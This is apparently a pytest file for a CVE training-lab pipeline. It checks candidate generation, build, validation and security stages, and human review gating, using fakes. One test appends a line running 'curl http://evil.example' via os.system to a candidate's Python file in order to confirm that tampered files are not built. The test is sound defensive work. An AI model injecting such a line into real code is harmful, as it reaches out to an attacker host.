"""The pipeline's stages and states, with Docker replaced by fakes (the real run is in
test_pipeline_docker.py)."""

from datetime import timedelta

import pytest

from app.models import CandidateStatus, StageStatus
from app.repositories.labgen import WorkingCandidateExists
from app.services.errors import ConflictError, InvalidInputError
from tests.labgen.conftest import ADMIN, CVE_ID, Labs


def run(labs: Labs, **kwargs: object):  # type: ignore[no-untyped-def]
    candidate = labs.pipeline.request(CVE_ID, ADMIN, **kwargs)  # type: ignore[arg-type]
    labs.pipeline.run(candidate.id)
    done = labs.repo.get(candidate.id)
    assert done is not None
    return done


def test_a_documented_cve_becomes_a_candidate_that_waits_for_a_human(labs: Labs) -> None:
    done = run(labs)
    assert done.status is CandidateStatus.AWAITING_REVIEW
    assert (done.build_status, done.validation_status, done.security_status) == (
        StageStatus.PASSED,
    ) * 3
    assert done.reviewer is None and done.version_id is None  # nothing was published
    assert labs.repo.versions() == []
    assert done.spec is not None
    spec = done.spec
    for field in (
        "cve_id",
        "affected_software",
        "safe_objective",
        "prerequisites",
        "learning_tasks",
        "expected_behavior",
        "verification_method",
        "remediation_task",
        "source_references",
    ):
        assert spec[field], field
    assert spec["affected_software"]["vulnerable_version"] == "4.2.3"
    assert spec["generation"]["method"] in ("blueprint", "blueprint+llm_text")
    assert len(done.validation_report["checks"]) == 10  # type: ignore[index]
    assert done.image_tag and done.image_tag.startswith("cvelearn-candidate/")


def test_the_candidate_image_is_never_in_the_student_repository(labs: Labs) -> None:
    done = run(labs)
    assert done.spec is not None
    assert done.spec["lab_template"]["image"].startswith("cvelearn-candidate/")


def test_a_cve_without_a_researched_guide_cannot_become_a_candidate(labs: Labs) -> None:
    with pytest.raises(InvalidInputError, match="guide"):
        labs.pipeline.request("CVE-2099-77777", ADMIN)
    with pytest.raises(InvalidInputError):
        labs.pipeline.request("not-a-cve", ADMIN)


def test_one_working_candidate_per_lab(labs: Labs) -> None:
    labs.pipeline.request(CVE_ID, ADMIN)
    with pytest.raises(ConflictError):
        labs.pipeline.request(CVE_ID, ADMIN)


def test_a_job_that_is_handed_twice_runs_once(labs: Labs) -> None:
    candidate = labs.pipeline.request(CVE_ID, ADMIN)
    labs.pipeline.run(candidate.id)
    labs.pipeline.run(candidate.id)  # a duplicate delivery: the stage is no longer claimable
    assert labs.builder.builds == 1 and labs.validator.calls == 1


def test_a_failed_build_stops_before_validation(labs: Labs) -> None:
    labs.builder.fail_build = True
    done = run(labs)
    assert done.status is CandidateStatus.BUILD_FAILED
    assert done.build_status is StageStatus.FAILED and "boom" in (done.build_log or "")
    assert labs.validator.calls == 0
    assert done.validation_status is StageStatus.PENDING


def test_a_failed_check_means_no_review_is_possible(labs: Labs) -> None:
    labs.validator.fail = {"remediation"}
    done = run(labs)
    assert done.status is CandidateStatus.VALIDATION_FAILED
    assert done.validation_status is StageStatus.FAILED
    assert done.error_code == "validation_failed"


def test_a_failed_runtime_security_check_blocks_approval(labs: Labs) -> None:
    labs.validator.fail_security = {"egress"}
    done = run(labs)
    assert done.status is CandidateStatus.VALIDATION_FAILED
    assert done.security_status is StageStatus.FAILED
    assert done.validation_status is StageStatus.PASSED


def test_a_candidate_whose_files_changed_is_not_built(labs: Labs) -> None:
    candidate = labs.pipeline.request(CVE_ID, ADMIN)
    labs.pipeline.run(candidate.id)
    labs.builder.images.clear()
    row = labs.repo.get(candidate.id)
    assert row is not None
    files = dict(row.files)
    name = next(n for n in files if n.endswith(".py"))
    files[name] += "\nimport os\nos.system('curl http://evil.example')\n"
    labs.repo.update_fields(row.id, files=files)
    assert labs.pipeline.restart_build(row.id) is not None
    labs.pipeline.run(row.id, "build")
    after = labs.repo.get(row.id)
    assert after is not None
    assert after.status is CandidateStatus.VALIDATION_FAILED
    assert after.security_status is StageStatus.FAILED
    assert after.error_code == "context_changed"
    assert not labs.builder.images


def test_a_rebuild_reruns_build_and_validation(labs: Labs) -> None:
    done = run(labs)
    labs.pipeline.restart_build(done.id)
    labs.pipeline.run(done.id, "build")
    assert labs.builder.builds == 2
    again = labs.repo.get(done.id)
    assert again is not None and again.status is CandidateStatus.AWAITING_REVIEW


def test_a_decided_candidate_cannot_be_rebuilt(labs: Labs) -> None:
    done = run(labs)
    labs.publisher.reject(done.id, ADMIN, "not a good fit")
    with pytest.raises(ConflictError):
        labs.pipeline.restart_build(done.id)


def test_a_new_revision_needs_the_previous_one_decided_first(labs: Labs) -> None:
    done = run(labs)
    with pytest.raises(ConflictError, match="Decide"):
        labs.pipeline.request(CVE_ID, ADMIN, parent=done)
    labs.publisher.request_changes(done.id, ADMIN, "use the other header")
    nxt = labs.pipeline.request(CVE_ID, ADMIN, parent=done, change_notes="use the other header")
    assert nxt.revision == 2 and nxt.parent_id == done.id


def test_reviewer_overrides_are_applied_and_recorded(labs: Labs) -> None:
    first = run(labs)
    labs.publisher.request_changes(first.id, ADMIN, "wrong endpoint")
    second = labs.pipeline.request(
        CVE_ID, ADMIN, parent=first, overrides={"endpoint": "/render", "bogus": "x"}
    )
    labs.pipeline.run(second.id)
    done = labs.repo.get(second.id)
    assert done is not None and done.spec is not None
    assert done.spec["generation"]["overrides"] == {"endpoint": "/render"}
    assert done.spec["blueprint"]["params"]["endpoint"] == "/render"


def test_a_stalled_job_can_be_released_only_after_a_while(labs: Labs) -> None:
    candidate = labs.pipeline.request(CVE_ID, ADMIN)
    with pytest.raises(ConflictError, match="still working"):
        labs.pipeline.release_stalled(candidate.id, timedelta(minutes=45))
    freed = labs.pipeline.release_stalled(candidate.id, timedelta(seconds=-1))
    assert freed.status is CandidateStatus.GENERATION_FAILED and freed.error_code == "stalled"
    assert labs.pipeline.request(CVE_ID, ADMIN, parent=freed).revision == 2
    with pytest.raises(ConflictError):
        labs.pipeline.release_stalled(freed.id, timedelta(seconds=-1))


def test_the_repository_refuses_a_second_working_revision(labs: Labs) -> None:
    labs.repo.create(family="cve-2099-1", cve_id="CVE-2099-0001", requested_by=ADMIN)
    with pytest.raises(WorkingCandidateExists):
        labs.repo.create(family="cve-2099-1", cve_id="CVE-2099-0001", requested_by=ADMIN)
